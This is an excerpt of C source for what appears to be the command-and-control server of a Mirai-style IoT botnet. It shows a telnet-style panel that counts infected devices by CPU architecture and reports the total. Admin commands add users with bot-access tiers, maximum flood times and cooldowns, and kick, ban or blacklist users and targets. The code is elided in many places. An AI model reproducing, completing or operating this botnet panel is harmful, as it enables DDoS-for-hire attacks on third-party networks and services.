                        sprintf(axis, "" RR "軸.Mips [" WW "%d" RR "]\r\n\x1b[0m", MIPS);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (MIPSEL != 0)
                    {
                        sprintf(axis, "" RR "軸.Mipsel [" WW "%d" RR "]\r\n\x1b[0m", MIPSEL);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (ARM4 != 0)
                    {
                        sprintf(axis, "" RR "軸.Armv4 [" WW "%d" RR "]\r\n\x1b[0m", ARM4);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (ARM5 != 0)
                    {
                        sprintf(axis, "" RR "軸.Armv5 [" WW "%d" RR "]\r\n\x1b[0m", ARM5);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (ARM6 != 0)
                    {
                        sprintf(axis, "" RR "軸.Armv6 [" WW "%d" RR "]\r\n\x1b[0m", ARM6);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (ARM7 != 0)
                    {
                        sprintf(axis, "" RR "軸.Armv7 [" WW "%d" RR "]\r\n\x1b[0m", ARM7);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (X86 != 0)
                    {
                        sprintf(axis, "" RR "軸.x86 [" WW "%d" RR "]\r\n\x1b[0m", X86);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (PPC != 0)
                    {
                        sprintf(axis, "" RR "軸.Powerpc [" WW "%d" RR "]\r\n\x1b[0m", PPC);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (SUPERH != 0)
                    {
                        sprintf(axis, "" RR "軸.SuperH [" WW "%d" RR "]\r\n\x1b[0m", SUPERH);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (M68K != 0)
                    {
                        sprintf(axis, "" RR "軸.M68k [" WW "%d" RR "]\r\n\x1b[0m", M68K);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (SPARC != 0)
                    {
                        sprintf(axis, "" RR "軸.Sparc [" WW "%d" RR "]\r\n\x1b[0m", SPARC);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (UNKNOWN != 0)
                    {
                        sprintf(axis, "" RR "軸.Unknown [" WW "%d" RR "]\r\n\x1b[0m", UNKNOWN);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    if (DEBUG != 0)
                    {
                        sprintf(axis, "" RR "軸.Debug [" WW "%d" RR "]\r\n\x1b[0m", DEBUG);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                    sprintf(axis, "" RR "Total: [" WW "%d" RR "]\r\n\x1b[0m", DevsConnected());
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                else
                {
                    sprintf(axis, "" RR "Devices: " WW "Enough To Beam Shit\r\n");
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
            }
        ...
        else if (strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
            ...
            readduser:
                if (send(axisfd, "" YY "[Username]" WW ": \x1b[37m", strlen("" YY "[Username]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                while (ret = read(axisfd, new_user, sizeof(new_user)))
                {
                    ...
                    if (strlen(new_user) < 3)
                        continue; // Username Can't Be Under 3 Chars
                    break;
                }
                for (kdm = 0; kdm < MXFDS; kdm++)
                {
                    ...
                    {
                        sprintf(axis, "\x1b[31mThe Username " WW "%s is Already Taken...\x1b[37m\r\n", new_user);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                        goto readduser;
                    }
                ...
                sleep(0.5);
                if (send(axisfd, "" YY "[Password]" WW ": \x1b[37m", strlen("" YY "[Password]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                Trim(new_pass);
                sleep(0.5);
                if (send(axisfd, "" YY "[Status]-[reg/admin]" WW ": \x1b[37m", strlen("" YY "[Status]-[reg/admin]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                while (ret = read(axisfd, new_type, sizeof(new_type)))
                {
                    new_type[ret] = '\0';
                    Trim(new_type);
                    if (strlen(new_type) < 2)
                        continue;
                    break;
                }
                Trim(new_type);
                sleep(0.5);
                if (send(axisfd, "" YY "[Expiration]-[DD/MM/YYYY Ex: 10/09/2019]" WW ": \x1b[37m", strlen("" YY "[Expiration]-[DD/MM/YYYY Ex: 10/09/2019]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                while (ret = read(axisfd, new_expr, sizeof(new_expr)))
                {
                    new_expr[ret] = '\0';
                    Trim(new_expr);
                    if (strlen(new_expr) < 8)
                        continue;
                    break;
                }
                Trim(new_expr);
                sleep(0.5);
                if (send(axisfd, "" YY "[Account Bot Access]-[0/50/100/1000/5000/-1(ALL)]" WW ": \x1b[37m", strlen("" YY "[Account Bot Access]-[0/50/100/1000/5000/-1(ALL)]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                while (ret = read(axisfd, new_plan, sizeof(new_plan)))
                {
                    new_plan[ret] = '\0';
                    Trim(new_plan);
                    if (strlen(new_plan) < 1)
                        continue;
                    break;
                }
                Trim(new_plan);
                sleep(0.5);
                if (send(axisfd, "" YY "[Max Flood Time(In Seconds)]" WW ": \x1b[37m", strlen("" YY "[Max Flood Time(In Seconds)]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                sleep(0.5);
                if (send(axisfd, "" YY "[Cooldown(In Seconds - 0 For None)]" WW ": \x1b[37m", strlen("" YY "[Cooldown(In Seconds - 0 For None)]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                fclose(adinfo);
                printf("" WW "%s\x1b[37m Added User [" YY "%s\x1b[37m]\n", MNGRS[axisfd].nick, new_user);
                sprintf(axis, "" WW "%s\x1b[37m Added User [" YY "%s\x1b[37m]\r\n", MNGRS[axisfd].nick, new_user);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                new_bc = 0;
            }
        ...
        else if (strstr(buf, "deluser") || strstr(buf, "DELUSER"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                int kdm;
                char deluser[50];
                if (send(axisfd, "" YY "Username: \x1b[37m", strlen("" YY "Username: \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                ...
                Trim(deluser);
                RMSTR(deluser, DB);
                sprintf(axis, "" RR "[" WW "Deleted User " RR "(" WW "%s" RR ")" WW "..." RR "]\r\n", deluser);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
                for (kdm = 0; kdm < MXFDS; kdm++)
                {
            ...
            if (MNGRS[axisfd].axadm == 1)
            {
                if (strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    for (id = 0; id < MXFDS; id++)
                    {
                        ...
                        {
                            sprintf(axis, "\n\x1b[31mGoodbye, Kicked By " RR "%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                            if (send(id, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                                return;
                            MNGRS[id].connd = 0;
                            close(id);
                            sprintf(axis, "" RR "[" WW "Kicked " RR "(" WW "%s" RR ")" WW "..." RR "]\r\n", user);
                            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                                return;
                        }
                    }
                ...
                else if (strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    ...
                    sprintf(axis, "\n\x1b[31mGoodbye, Kicked By " RR "%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                    if (send(uid, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                    MNGRS[uid].connd = 0;
                    close(uid);
                    sprintf(axis, "" RR "[" WW "Kicked User with ID# " RR "(" WW "%d" RR ")" WW "..." RR "]\r\n", uid);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
            }
            ...
            if (MNGRS[axisfd].axadm == 1)
            {
                ...
                banstart1:
                    ...
                    else
                    {
                        ...
                        sprintf(axis, "\n\x1b[31mGoodbye, Banned by " RR "%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                        if (send(id, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                        MNGRS[id].connd = 0;
                        close(id);
                        sprintf(axis, "" RR "[" WW "Banned User " RR "(" WW "%s" RR ")" WW "..." RR "]\r\n", iusername);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                    }
                }
                ...
                banstart:
                    ...
                    MNGRS[kx].connd = 0;
                    close(uid);
                    sprintf(axis, "" RR "[" WW "Banned User with ID# " RR "(" WW "%d" RR ")" WW "..." RR "]\r\n", uid);
                    if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                        return;
                }
                ...
                banstart2:
                    ...
                    for (kx = 0; kx < MXFDS; kx++)
                    {
                        ...
                        {
                            sprintf(axis, "\n\x1b[31mGoodbye, Banned by " RR "%s\x1b[0m...\r\n", MNGRS[axisfd].nick);
                            if (send(kx, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                                return;
                            MNGRS[kx].connd = 0;
                            close(kx);
                            sprintf(axis, "" RR "[" WW "Banned User with IP " RR "(" WW "%d" RR ")" WW "..." RR "]\r\n", target);
                            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                                return;
                        }
                    }
                ...
                if (strstr(buf, "ip=") || strstr(buf, "IP="))
                {
                    ...
                    for (kx = 0; kx < MXFDS; kx++)
                    {
                        if (!strcmp(CNSL[kx].banned, target))
                        {
                            ...
                            sprintf(axis, "" RR "[" WW "Unbanned User with IP " RR "(" WW "%d" RR ")" WW "..." RR "]\r\n", target);
                            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                                return;
                        }
                    }
        ...
        else if (strstr(buf, "BLACKLIST") || strstr(buf, "blacklist"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                int ret;
                char new_black[40];
                if (send(axisfd, "" YY "[Target]" WW ": \x1b[37m", strlen("" YY "[Target]" WW ": \x1b[37m"), MSG_NOSIGNAL) == -1)
                    return;
                while (ret = read(axisfd, new_black, sizeof(new_black)))
                {
                    new_black[ret] = '\0';
                    Trim(new_black);
                    if (strlen(new_black) < 3)
                        continue;
                    break;
                }
                Trim(new_black);
                ...
                fclose(adinfo);
                printf("" WW "%s\x1b[37m BlackListed [" YY "%s\x1b[37m]\n", MNGRS[axisfd].nick, new_black);
                sprintf(axis, "" RR "[" WW "BlackListed " RR "(" WW "%s" RR ")" WW "..." RR "]\r\n", new_black);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
            else
        ...
        else if (strstr(buf, "RMBLK") || strstr(buf, "rmblk"))
        {
            if (MNGRS[axisfd].axadm == 1)
            {
                ...
                printf("" WW "%s\x1b[37m Un-BlackListed [" YY "%s\x1b[37m]\n", MNGRS[axisfd].nick, rmblack);
                sprintf(axis, "" RR "[" WW "Un-BlackListed " RR "(" WW "%s" RR ")" WW "..." RR "]\r\n", rmblack);
                if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                    return;
            }
            else
        ...
        else if (strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            ...
            Trim(url);
            resolvehttp(url, ip);
            printf("" RR "[\x1b[0mResolver" RR "] %s -> %s\n", url, ip);
            sprintf(axis, "" RR "[\x1b[0mResolver" RR "] %s -> %s\r\n", url, ip);
            if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                return;
        }
        else if (strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
        {
            ...
            if (atoi(myhost) >= 8)
            {
                ...
                else
                {
                    ...
                    {
                        sprintf(axis, "\x1b[0m[" RR "IPLookup\x1b[0m] " RR "Getting Info For -> %s...\r\n", myhost);
                        if (send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1)
                            return;
                        char ch;
                        int retrv = 0;
        ...
        {
            sprintf(axis, "\r\n            \x1b[0m| " RR "%s \x1b[0m| " RR "Version " WW "%s \x1b[0m| " RR "By " WW "%s \x1b[0m|\r\n", cnc_n, cnc_ver, cpyrt_n);
            if (send(axisfd, axis, strlen(axis), 0) == -1)
                return;
        }
        Trim(buf);
        if (strlen(buf) == 0)
        {
            snprintf(axisprompt, sizeof(axisprompt), "" RR "%s" WW "@" RR "軸" WW "~#" RR ": " WW "", ACCS[fnd].axid);
            if (send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1)
                return;
            continue;
        }
    ...
    if (MNGRS[axisfd].axadm == 1 && MNGRS[axisfd].connd)
    {
        ...
        printf(AXISN " " RR "Admin(" WW "%s" RR ":" WW "%s" RR ") Logged Out " AXISN "\n", MNGRS[axisfd].nick, management_ip);
        UsersOnline--;
    }
    else if (MNGRS[axisfd].axadm == 0 && MNGRS[axisfd].connd)
    {
        Broadcast(buf, axisfd, usrnms, 2, MXFDS, axisfd);
        printf(AXISN " " RR "User(" WW "%s" RR ":" WW "%s" RR ") Logged Out " AXISN "\n", MNGRS[axisfd].nick, management_ip);
        UsersOnline--;
    }
